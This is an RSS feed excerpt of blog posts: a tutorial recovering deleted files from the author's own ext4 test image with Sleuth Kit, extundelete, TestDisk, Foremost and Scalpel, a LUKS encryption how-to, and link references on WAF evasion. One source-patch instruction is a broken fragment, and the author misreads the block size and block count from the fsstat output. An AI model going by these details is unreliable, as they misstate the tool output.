&lt;em&gt;&lt;a href=&#34;https://www.secjuice.com/content/images/2018/08/waf3_2.png&#34;&gt;https://www.secjuice.com/content/images/2018/08/waf3_2.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;more-reading&#34;&gt;More Reading&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/&#34;&gt;https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://jlajara.gitlab.io/Bypass_WAF_Unicode&#34;&gt;https://jlajara.gitlab.io/Bypass_WAF_Unicode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/&#34;&gt;https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.secjuice.com/web-application-firewall-waf-evasion/&#34;&gt;https://www.sisainfosec.com/blogs/identifying-web-application-firewall-in-a-network/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf&#34;&gt;https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>5 Ways I Found Your Deleted Files</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-05-13_5-ways-i-found-your-deleted-files-492407dbd467/</link>
      <pubDate>Sat, 13 May 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-05-13_5-ways-i-found-your-deleted-files-492407dbd467/</guid>
      <description>&lt;h2 id=&#34;computer-forensics-for-filerecovery&#34;&gt;Computer Forensics for File Recovery&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*MnBiAcwiwaFGOOAe.jpg&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://edgy.app/wp-content/uploads/2018/04/dataleakhackerGorodenkoff-970x546.jpg&#34;&gt;https://edgy.app/wp-content/uploads/2018/04/dataleakhackerGorodenkoff-970x546.jpg&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;When a file is “deleted”, its contents aren’t typically erased from the storage device that it was stored on. More often than not, the blocks that stored the file are marked as unallocated and the filesystem pointers are removed from it. The implication is that the file still exists on the disk until it is overwritten.&lt;/p&gt;
&lt;p&gt;There are many methods to recovering the raw, unallocated data. &lt;a href=&#34;https://forensics.wiki/tools_data_recovery/&#34;&gt;This website&lt;/a&gt; lists many tools that can be used for file recovery in different scenarios. In this article, I’ll be walking through 5 different tools that can be used to recover data.&lt;/p&gt;
&lt;h1 id=&#34;setup&#34;&gt;Setup&lt;/h1&gt;
&lt;p&gt;I’ll be using doing forensic analysis on a drive that I created and attached to my Kali Linux VM. To see how this is done, you can reference &lt;a href=&#34;https://opensource.com/article/19/4/create-filesystem-linux-partition&#34;&gt;this article&lt;/a&gt;. On this drive, I saved and then deleted an image file and text file.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*HRHkhSM5bBjI9ouCYNpU4w.png&#34; alt=&#34;Image of commands I used to set up file system for forensic analysis&#34;  /&gt;

I’ll start by doing general enumeration on the disk image. Then, I’ll showcase a variety of file recovery techniques used by forensic analysts that allowed me to recover the deleted files. Many of the tools used will be from the &lt;a href=&#34;http://sleuthkit.org/sleuthkit&#34;&gt;Sleuth Kit&lt;/a&gt; (TSK).&lt;/p&gt;
&lt;p&gt;Before starting, I’ll unmount the filesystem, create a duplicate of it, remove write permissions from the duplicate, and verify the integrity of the duplicate against the original hash of &lt;code&gt;/dev/sdb&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cd ../ &amp;amp;&amp;amp; umount /mnt/secret # unmount /mnt/secret  
  
$ dd if=/dev/sdb of=/home/kali/forensics/sdb.img # copy /dev/sdb into sdb.img  
22286+0 records in  
22286+0 records out  
11410432 bytes (11 MB, 11 MiB) copied, 0.0412053 s, 277 MB/s  
  
$ chmod a-w /home/kali/forensics/sdb.img # remove write access to the image  
   
$ md5sum /home/kali/forensics/sdb.img /dev/sdb  
6c49fb21916d59e0df69453959392e23 /home/kali/forensics/sdb.img  
6c49fb21916d59e0df69453959392e23 /dev/sdb
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;image-analysis&#34;&gt;Image Analysis&lt;/h2&gt;
&lt;p&gt;Using the &lt;code&gt;file&lt;/code&gt; command reveals that the image uses an ext4 file system.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4gowWgQfJ4J1FXwjFHjhQg.png&#34; alt=&#34;&#34;  /&gt;

Furthermore, the &lt;code&gt;stat&lt;/code&gt; command displays information about the image such as its size, time stamps, and block details.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*_T8VXPuyfnuQ7Rm5WNIOsQ.png&#34; alt=&#34;output of the stat command&#34;  /&gt;

With the information that the image uses ext4, the &lt;code&gt;fsstat&lt;/code&gt; command can be used to extract more detailed information about the file system, metadata, content data, and block groups.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ fsstat -f ext4 sdb.img   
FILE SYSTEM INFORMATION  
--------------------------------------------  
File System Type: Ext4  
Volume Name:   
Volume ID: dc8a4fb36dce8eabee4c51cf01c2d52a  
  
Last Written at: 2023-05-09 22:35:31 (EDT)  
Last Checked at: 2023-05-09 22:23:26 (EDT)  
  
Last Mounted at: 2023-05-09 22:24:27 (EDT)  
Unmounted properly  
Last mounted on: /mnt/secret  
  
Source OS: Linux  
Dynamic Structure  
Compat Features: Journal, Ext Attributes, Resize Inode, Dir Index  
InCompat Features: Filetype, Extents, 64bit, Flexible Block Groups,   
Read Only Compat Features: Sparse Super, Large File, Huge File, Extra Inode Size  
  
Journal ID: 00  
Journal Inode: 8  
  
METADATA INFORMATION  
--------------------------------------------  
Inode Range: 1 - 2785  
Root Directory: 2  
Free Inodes: 2773  
Inode Size: 256  
  
CONTENT INFORMATION  
--------------------------------------------  
Block Groups Per Flex Group: 16  
Block Range: 0 - 11139  
Block Size: 1024  
Reserved Blocks Before Block Groups: 1  
Free Blocks: 9223  
  
BLOCK GROUP INFORMATION  
--------------------------------------------  
Number of Block Groups: 2  
Inodes per group: 1392  
Blocks per group: 8192  
  
Group: 0:  
 Block Group Flags: [INODE\_ZEROED]   
 Inode Range: 1 - 1392  
 Block Range: 1 - 8192  
 Layout:  
 Super Block: 1 - 1  
 Group Descriptor Table: 2 - 2  
 Group Descriptor Growth Blocks: 3 - 89  
 Data bitmap: 90 - 90  
 Inode bitmap: 92 - 92  
 Inode Table: 94 - 441  
 Uninit Data Bitmaps: 92 - 105  
 Uninit Inode Bitmaps: 94 - 107  
 Uninit Inode Table: 790 - 5661  
 Data Blocks: 5690 - 8192  
 Free Inodes: 1381 (99%)  
 Free Blocks: 6365 (77%)  
 Total Directories: 2  
 Stored Checksum: 0x7DEB  
  
Group: 1:  
 Block Group Flags: [INODE\_UNINIT, INODE\_ZEROED]   
 Inode Range: 1393 - 2784  
 Block Range: 8193 - 11139  
 Layout:  
 Super Block: 8193 - 8193  
 Group Descriptor Table: 8194 - 8194  
 Group Descriptor Growth Blocks: 8195 - 8281  
 Data bitmap: 91 - 91  
 Inode bitmap: 93 - 93  
 Inode Table: 442 - 789  
 Data Blocks: 8282 - 11139  
 Free Inodes: 1392 (100%)  
 Free Blocks: 2858 (96%)  
 Total Directories: 0  
 Stored Checksum: 0xDFA7
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Based on this output, it is clear that the block size is 1024 bits, there are 1113 total blocks, and there are 2785 inodes.&lt;/p&gt;
&lt;p&gt;In addition, &lt;code&gt;parted&lt;/code&gt; can be used to find more information on the partition table, which can be useful when using scalpel.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*EAJIlLWQ5g3rEgqc5nPNbQ.png&#34; alt=&#34;&#34;  /&gt;

Finally, running &lt;code&gt;strings&lt;/code&gt; on the image gives more insight as to what is in the filesystem. It appears that my &lt;code&gt;secret.txt&lt;/code&gt; file with the contents &lt;code&gt;Hello World&lt;/code&gt; is appearing from the &lt;code&gt;strings&lt;/code&gt; command in addition to a failed image download attempt.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*hINgjWeGy7ttVHl1qDs1EQ.png&#34; alt=&#34;&#34;  /&gt;

In the command &lt;code&gt;strings -a --radix=d sdb.img&lt;/code&gt;, &lt;code&gt;-a&lt;/code&gt; is an option to scan the entire file and &lt;code&gt;--radix=d&lt;/code&gt; tells &lt;code&gt;strings&lt;/code&gt; to show the offset that the string was found at in base 10.&lt;/p&gt;
&lt;h2 id=&#34;analyzing-thefiles&#34;&gt;Analyzing the Files&lt;/h2&gt;
&lt;p&gt;This particular image does not have any files currently in it aside from deleted files, so there isn’t much information to gain from mounting it and analyzing the files. In cases where it is desireable to do so, the following command can be used:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ mount -o ro,loop,noexec,noatime sdb.img
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Below, I’ll explain what the options do:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-o&lt;/code&gt;: sets the options for mounting &lt;code&gt;sdb.img&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ro&lt;/strong&gt;: an option to mount the file system as being read-only&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;loop&lt;/strong&gt;: mount the file system on a loop device&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;noexec&lt;/strong&gt;: disallow execution&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;noatime&lt;/strong&gt;: don’t change the access time of the files&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can then continue to run &lt;code&gt;file&lt;/code&gt; on the files within the mounted loop device and save their md5 hashes to verify integrity.&lt;/p&gt;
&lt;h1 id=&#34;recovering-thefiles&#34;&gt;Recovering the Files&lt;/h1&gt;
&lt;h2 id=&#34;method-1-using-sleuthkithttpsleuthkitorgsleuthkit&#34;&gt;Method 1: Using &lt;a href=&#34;http://sleuthkit.org/sleuthkit/&#34;&gt;Sleuth Kit&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Often, if you have deleted files, they may be displayed with &lt;code&gt;fls sdb.img&lt;/code&gt;, enumerated with &lt;code&gt;istat -o &amp;lt;offset&amp;gt; sdb.img &amp;lt;inode_number&amp;gt;&lt;/code&gt;, and recovered with &lt;code&gt;icat -o &amp;lt;offset&amp;gt; sdb.img &amp;lt;inode_number&amp;gt;&lt;/code&gt;. An example of the latter 2 steps are shown in the screenshot below.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*mc44fgKV8os0qCVpYYZiJQ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://www.therootuser.com/wp-content/uploads/2017/11/Screenshot-2017-11-07-17.27.58.png&#34;&gt;https://www.therootuser.com/wp-content/uploads/2017/11/Screenshot-2017-11-07-17.27.58.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This does not appear to be the case for me, however. My deleted files are not appearing from the &lt;code&gt;fls&lt;/code&gt; command. Instead, I see a variable called &lt;code&gt;$OrphanFiles&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*hQXtm0cZ7wge3IgQlexR-Q.png&#34; alt=&#34;&#34;  /&gt;

&lt;code&gt;$OrphanFiles&lt;/code&gt; are files that still exist in the image, but are no longer able to be accessed from the root directory. &lt;code&gt;$OrphanFiles&lt;/code&gt; is not an actual directory on the image, it is Sleuth Kit’s virtual way to demonstrate that the file metadata still exists (&lt;a href=&#34;https://wiki.sleuthkit.org/index.php?title=Orphan_Files&#34;&gt;read more&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;To recover these orphan files, I will attempt a few techniques starting with &lt;code&gt;extundelete&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;method-2-extundeletehttpsextundeletesourceforgenet&#34;&gt;Method 2: &lt;a href=&#34;https://extundelete.sourceforge.net/&#34;&gt;Extundelete&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;This tool can be used to recover files on ext3 and ext4 filesystems. I was having some difficulties with the build from &lt;code&gt;apt&lt;/code&gt;, so I build the program from source with the following commands to it working again:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;apt update &amp;amp;&amp;amp; apt install -y libext2fs-dev   
git clone https://github.com/cherojeong/extundelete.git  
./configure  
make  
src/extundelete --restore-all /path/to/image.img
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;os &amp;lt;&amp;lt; “Directory ACL: “ &amp;lt;&amp;lt; inode.i_dir_acl &amp;lt;&amp;lt; std::endl;&lt;/code&gt; with &lt;code&gt;os &amp;lt;&amp;lt; “Directory ACL: “ &amp;lt;&amp;lt; inode.i_file_acl &amp;lt;&amp;lt; std::endl;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The command &lt;code&gt;extundelete --restore-all sdb.img&lt;/code&gt; can be used to recover files.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Ipv-ABMSCpXNtc6PZT5zqQ.png&#34; alt=&#34;&#34;  /&gt;

As you can see in the screenshot above, the tool was unsuccessful in recovering the orphan files. This is still a viable option that can work in many scenarios which is why I decided to include it in this article.&lt;/p&gt;
&lt;p&gt;I’m not giving up yet. We’ll try again!&lt;/p&gt;
&lt;h2 id=&#34;method-3testdiskhttpswwwcgsecurityorgwikitestdisk&#34;&gt;Method 3: &lt;a href=&#34;https://www.cgsecurity.org/wiki/TestDisk&#34;&gt;TestDisk&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;.tar.bz&lt;/code&gt; file can be downloaded &lt;a href=&#34;https://www.cgsecurity.org/wiki/TestDisk_Download&#34;&gt;here&lt;/a&gt;. I’m using version 7.2. Note that in order for &lt;code&gt;TestDisk&lt;/code&gt; to work, you must run it in the download directory. Otherwise you might get an error like &lt;code&gt;*** Error in &lt;/code&gt;/path/to/testdisk-7.2-WIP/photorec_static&amp;rsquo;: malloc(): memory corruption: 0x0000000002617d29 ***`.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# extract and run the file  
tar -xf testdisk-7.2-WIP.linux26-x86\_64.tar.bz2  
cd testdisk-7.2-WIP  
./photorec\_static /path/to/sdb.img /log 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A help menu will appear. I’ll first select the image that I want to work with.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*vEuqI7RnAWsvLfrH9n88Pw.png&#34; alt=&#34;&#34;  /&gt;

Then, I select the option for the partition table for the media. Mine does not have one, so I choose “None”. I verified that this was the only option that was able to list files for me.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*c5iJeI2oyLMdmRu_bBD5Qg.png&#34; alt=&#34;&#34;  /&gt;

After this, I navigate to the “List” option at the bottom of the terminal and press &lt;code&gt;Enter&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*jl17is949wOoNF0JEzBcIg.png&#34; alt=&#34;&#34;  /&gt;

This leads me to the listing of the files on the image with the successfully recovered ones in &lt;strong&gt;red&lt;/strong&gt; text.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*yYQEslxR1RWkUbkEX743Bg.png&#34; alt=&#34;&#34;  /&gt;

As you can see in the screenshot, there are no new files there listed in red. This means that &lt;code&gt;TestDisk&lt;/code&gt; was unsuccessful in recovering the deleted files.&lt;/p&gt;
&lt;p&gt;It’s okay, I still got a few more tricks up my sleeve.&lt;/p&gt;
&lt;h2 id=&#34;method-4foremosthttpssourceforgenetprojectsforemost&#34;&gt;Method 4: &lt;a href=&#34;https://sourceforge.net/projects/foremost/&#34;&gt;Foremost&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Foremost can be installed with &lt;code&gt;apt&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt install foremost
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This tool uses a technique known as &lt;strong&gt;file carving&lt;/strong&gt; which involves searching through the raw data on a disk and carving out the values between the header and/or footer of the file.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ayacIY6WQdxAYksd_nwT8g.png&#34; alt=&#34;&#34;  /&gt;

Alas, we were able to recover a deleted image file from the drive with &lt;code&gt;foremost -t jpeg -o recovered-files -i sdb.img&lt;/code&gt;. The recovered image renders as expected in the Image Viewer. What a pretty camp fire.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*kA2aubO7prDBFW9Xx0cGvQ.png&#34; alt=&#34;&#34;  /&gt;

The fact that this worked while the previous 3 methods did not further demonstrates that different tools and techniques will be more effective at data recovery in different scenarios.&lt;/p&gt;
&lt;p&gt;It’s also worth mentioning that you can edit the &lt;code&gt;/etc/foremost.conf&lt;/code&gt; file to contain your own custom headers and footers for the file you are looking for. Modifying these values will be explored in the next and final method.&lt;/p&gt;
&lt;h2 id=&#34;method-5scalpelhttpsgithubcomsleuthkitscalpel&#34;&gt;Method 5: &lt;a href=&#34;https://github.com/sleuthkit/scalpel&#34;&gt;Scalpel&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Scalpel is much like Foremost with added flexibility. You are not as limited on the file types and headers, although there is a way to modify foremost to have the same customization that scalpel provides.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt install scalpel  
cp /etc/scalpel/scalpel.conf .  
vim scalpel.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I’ll edit the config with the bit of background information that I have. I know that I’m attempting to recover a JPEG file and I also know that there was a text file that began with the word “Hello”. By using &lt;code&gt;xxd&lt;/code&gt;, I can determine the file headers for a &lt;code&gt;.txt&lt;/code&gt; file starting with the word “Hello”. In this case, it would be &lt;code&gt;\x48\x65\x6c\x6c\x6f&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ echo -n Hello | xxd   
00000000: 4865 6c6c 6f Hello.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We will use this information to update the &lt;code&gt;scalpel.conf&lt;/code&gt; file in &lt;code&gt;vim&lt;/code&gt;. As explained in the comments at the top of the config file, the first column indicates the file extension. The second is whether the header and footer are case sensitive, the third is the header in hexadecimal bytes, the fourth column is an optional footer, and the fifth column is an optional parameter to search backwards from the header rather than just forward.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Y6kTU1JxILxivTOYbHN5tQ.png&#34; alt=&#34;&#34;  /&gt;

With these options set, &lt;code&gt;scalpel&lt;/code&gt; can now be ran to extract these files from the drive.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;scalpel -o recovered-files\_scalpel -c scalpel.conf sdb.img
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*O3huS4-S2BausvT-s2KiYw.png&#34; alt=&#34;&#34;  /&gt;

It appears that the text file was successfully recovered.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*jASCyrkTBYVfhWQxZkk3lg.png&#34; alt=&#34;&#34;  /&gt;

The image was recovered as well.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*5ixUUenRR50lIavpZ0oyIw.png&#34; alt=&#34;&#34;  /&gt;

Conclusion&lt;/h1&gt;
&lt;p&gt;There’s many ways to achieve the same outcome. The different tools showcased here have their specific applications where they perform best. Even though not all the methods outlined here worked for my particular situation, that doesn’t mean they won’t work for you. There are many factors that determine whether file recovery will be successful including the partitioning table type, how long it has been since they were deleted, the size of the file (smaller files are more likely to be recovered), the health of the storage device, and the operations that have been done on the drive since deleting the files such as reformatting the drive.&lt;/p&gt;
&lt;p&gt;I hope that through reading this article, you were able to deepen your understanding of file recovery and gain practical knowledge that you can apply in the real world. Thanks for reading and I’ll see you next time.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>How to Encrypt a Drive in Linux</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-05-05_how-to-encrypt-a-drive-in-linux-83b3001744f4/</link>
      <pubDate>Fri, 05 May 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-05-05_how-to-encrypt-a-drive-in-linux-83b3001744f4/</guid>
      <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Hey everyone, this is a pretty quick article on LUKS drive encryption on Linux with the &lt;code&gt;cryptsetup&lt;/code&gt; library. By following the steps outlined here, you will be able to encrypt a drive, decrypt it, and mount it. This was done in a Kali Linux VM and commands may vary for other distributions.&lt;/p&gt;
&lt;p&gt;Disclaimer: This is not an area that I have much experience in so if details are inaccurate, I apologize in advance.&lt;/p&gt;
&lt;h2 id=&#34;creating-a-new-partition&#34;&gt;Creating a new partition&lt;/h2&gt;
&lt;p&gt;I’m using a virtual machine with 2 virtual hard disks.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ao7i4G4xZFiEXNb2nX2-bQ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Demonstrating my disks with “lsblk -e7”&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I’ll be using a tool called &lt;code&gt;parted&lt;/code&gt; to create a partition on &lt;code&gt;/dev/sdb&lt;/code&gt;. Historically, when a system uses the Master Boot Record (MBR) partition table, &lt;code&gt;fdisk&lt;/code&gt; is used to manage the partition. In this article, I’ll use &lt;code&gt;parted&lt;/code&gt; because of its usability in scripting and automation.&lt;/p&gt;
&lt;p&gt;I’ll start by listing the information of the drives.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;parted -s /dev/sdb print all
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*5w3JBHztlFmtojmfpSwqAg.png&#34; alt=&#34;&#34;  /&gt;

The output &lt;code&gt;msdos&lt;/code&gt; under &lt;code&gt;/dev/sda&lt;/code&gt;, indicates that &lt;code&gt;sda&lt;/code&gt; is using the MBR partition table. Learn more about partition table types &lt;a href=&#34;https://en.wikipedia.org/wiki/Disk_partitioning&#34;&gt;here&lt;/a&gt; and &lt;a href=&#34;https://wiki.archlinux.org/title/Partitioning&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I’ll now create the GPT partition table on &lt;code&gt;/dev/sdb&lt;/code&gt;. You’ll notice that after running the command, &lt;code&gt;/dev/sdb&lt;/code&gt; now appears as a &lt;code&gt;gpt&lt;/code&gt; partition table.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*tZM4UvgCMQXekmpmoDJumg.png&#34; alt=&#34;&#34;  /&gt;

I then create a partition on the disk with the ext4 file system.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*dbuTKtvJcQZI4cFNANRylQ.png&#34; alt=&#34;&#34;  /&gt;

The commands I used for this are below. The values for the start and ending offsets when creating the partitions can be expressed in both percentages and exact byte values. Reference the &lt;a href=&#34;https://linux.die.net/man/8/parted&#34;&gt;man page&lt;/a&gt; for more details.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;parted -s /dev/sdb mklabel gpt  
parted -s /dev/sdb mkpart primary ext4 0% 50MiB
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;encrypting-thedrive&#34;&gt;Encrypting the Drive&lt;/h2&gt;
&lt;p&gt;This demonstrates how to encrypt file system using LUKS. It is important to remember the passphrase that you enter while encrypting the partition because it is a key piece of information when decrypting the drive.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cryptsetup luksFormat /dev/sdb # encrypt /dev/sdb with luks
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;decrypting-thedrive&#34;&gt;Decrypting the Drive&lt;/h2&gt;
&lt;p&gt;You’ll need to do this before you’re able to mount and use the partition on the drive.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cryptsetup open /dev/sdb encrypted # open the encrypted drive as /dev/mapper/encrypted  
mkfs.ext4 /dev/mapper/encrypted # create a filesystem on the device (only needed the first time you open the encrypted drive)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;mounting-the-partition&#34;&gt;Mounting the Partition&lt;/h2&gt;
&lt;p&gt;In order to actually use the partition and the file system on it, we must mount it.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mkdir -p /mnt/encrypted # prepare the mount point  
mount /dev/mapper/encrypted /mnt/encrypted # mount the decrypted filesystem on /mnt/encrypted
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;unmounting-the-partition&#34;&gt;Unmounting the Partition&lt;/h2&gt;
&lt;p&gt;When you’re done using the drive, you can unmount it.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;umount /mnt/encrypted 
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;closing-and-re-encrypting-the-partition&#34;&gt;Closing and Re-encrypting the Partition&lt;/h2&gt;
&lt;p&gt;In its unmounted state, it is still decrypted. To re-encrypt and close the drive, you can run the following command:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cryptsetup close /dev/mapper/encrypted
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;digging-deeper&#34;&gt;Digging Deeper&lt;/h1&gt;
&lt;p&gt;Because I’m a curious person, I’ll share with you some commands that you can use to get more information on the file system that you just created and other findings that I thought were interesting.&lt;/p&gt;
&lt;h2 id=&#34;file-systemmetadata&#34;&gt;File System Metadata&lt;/h2&gt;
&lt;p&gt;After decrypting the drive, you can view the metadata of your filesystem.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cryptsetup --type luks open /dev/sdb encrypted
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These are some commands that will give you infromation.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;df -hT /dev/mapper/encrypted  
tune2fs -l /dev/sdb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As shown in the screenshots, you’re able to view the number of inodes, the block count, block size, filesystem magic number, and much more.&lt;/p&gt;
&lt;h2 id=&#34;inodes&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*k6QJaeh0pBMsxnfbGk6Rog.png&#34; alt=&#34;&#34;  /&gt;

&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*BXNCkBoJaesaE0AfBZlOsQ.png&#34; alt=&#34;&#34;  /&gt;

Inodes&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Inode&#34;&gt;Inodes&lt;/a&gt; are a data structure that contain information about files in the Linux filesystem. It contains metadata such as the block number that the file is located in on the hard drive, permissions, and file owner. In an ext4 filesystem, the number of inodes in is fixed, whereas in XFS and JFS, the number of inodes is dynamic. The result is that in ext4 filesystems where many inodes are used, such as in situations where many directories, symbolic links, and/or small files are made, an error message that the system is out of space may occur when there is plenty of space left. The reason for this is simply that the filesystem has no more available inodes to assign to new files. This is a relatively common occurence for mail servers that often hold many small files.&lt;/p&gt;
&lt;p&gt;The number of inodes on your system’s filesystems can be viewed with &lt;code&gt;df -hi&lt;/code&gt;.&lt;/p&gt;
